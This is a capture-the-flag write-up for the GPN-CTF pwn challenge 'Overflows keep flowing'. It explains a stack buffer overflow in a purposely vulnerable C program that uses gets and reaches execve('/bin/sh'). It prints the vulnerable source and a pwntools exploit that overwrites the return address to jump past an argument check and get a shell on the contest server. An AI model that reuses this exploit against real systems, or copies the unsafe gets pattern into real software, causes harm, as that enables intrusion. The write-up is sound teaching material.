---
title: "GPN-CTF: Overflows keep flowing" 
date: 2023-06-11 12:41:00 +0300
categories: ["pwn", "buffer overflows"]
tags: ["easy",'ctf' , "kitctf", "gpn-ctf", "intro-to-pwn"]
author: calvin-kimani
---

>This is the sequel to [overflows in the fl4gtory](./2023-06-10-GPN-CTF-overflow-in-the-fl4gtory-writeup.md)
{: .prompt-tip }

# Overflow in the Fl4gtory
## Challenge Description:

The "Overflows keep flowing" challenge presents a vulnerable program with a simple buffer overflow vulnerability. The objective is to exploit this vulnerability to gain control over the program and gain `remote code execution` by calling `execve` within the program, which will grant access to the flag.

![challenge desc](/assets/ctf/pwn/2023/KitCTF/overflows-keep-flowing/overflows-keep-flowing-desc.png)


### Vulnerable Code:
```c
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-stack-protector -o overflows-keep-flowing overflows-keep-flowing.c

void shutoff(long long int arg1) {
	printf("Phew. Another accident prevented. Shutting off %lld\n", arg1);
	if (arg1 == 0xdeadbeefd3adc0de) {
		execve("/bin/sh", NULL, NULL);
	} else {
		exit(0);
	}
}

int main() {
	char buf[0xff];
	gets(buf);
	puts(buf);
	return 0;
}
```

## Vulnerable code explanation
The program hasn't changed that much from its predecessor. There's still the vulnerable buffer `buf`. The user is still prompted/required to enter input by the use of `gets` **(man gets)** where the input is then stored in buf and the written input displayed to the user by use of `puts(buf)` **(man puts)**

There's a new 'safety check' which we will gladly bypass. The shutoff function when called, checks whether it's one and only argument `arg1` is equal to the value of `0xdeadbeefd3adc0de` which in decimal is "1.6045691e+19". If they are equal, `execve` **man execve** from the standard library is called with `"/bin/sh"` as the program to run with no commandline arguments as seen by `NULL`. We can bypass this whole check by calling `execve` directly instead of `shutoff` as we did earlier. So we first need to know where it's located.

We fire up `gdb` with `gef` to search for it.

![gdb output](/assets/ctf/pwn/2023/KitCTF/overflows-keep-flowing/gdb.png)

>We could have pwned the binary by also just loading the `arg1` buffer with the required value but why complicate stuff. I'll explain how we can overwrite arguments with the desired value in a future post.
{: .prompt-tip }

## Exploitation

We know when a function is called during program execution, the called function's arguments are pushed on the stack in the reverse order of how they're declared! So we can't call `execve` directly because it will fail as it doesn't have it's required arguments. So we need to go back a few instructions to where it's arguments are being loaded in the right registers before it's called.
From the gdb output we can see this is 56 addresses from shutoff's addresses. Now we need to overwrite the ret with this address !!

We use the pwn library in Python to assist in building the payload and interacting with the target program.

```python
from pwn import *

context.terminal = ["konsole", "-e"]  # Substitute your terminal

# Find the location of the shutoff functions
elf = ELF("./overflows-keep-flowing")
shutoff_addr = elf.symbols["shutoff"]

# Craft the payload
payload = b"A" * 264
payload += p64(shutoff_addr+56)

# Launch the process and send the payload
# process = process("./overflows-keep-flowing")
# process.sendline(payload)
# process.interactive()

# remote server
target = remote('overflows-keep-flowing-0.chals.kitctf.de', 1337, ssl=True)
target.sendline(payload)

# Profit $$
print(target.recv())
target.interactive()
```

### reading the flag

After constructing the payload, we establish a connection to the target server using the provided IP address and port. We then send the payload to the program. Upon successful exploitation, the shutoff() function will be executed, and we can read the flag.

![program exploited](/assets/ctf/pwn/2023/KitCTF/overflows-keep-flowing/overflows-keep-flowing.png)

By leveraging the buffer overflow vulnerability in the "Overflows keep flowing" challenge, we successfully gained control over the program's execution flow and executed the shutoff() function to obtain the flag.


>Happy hacking :)
{: .prompt-tip }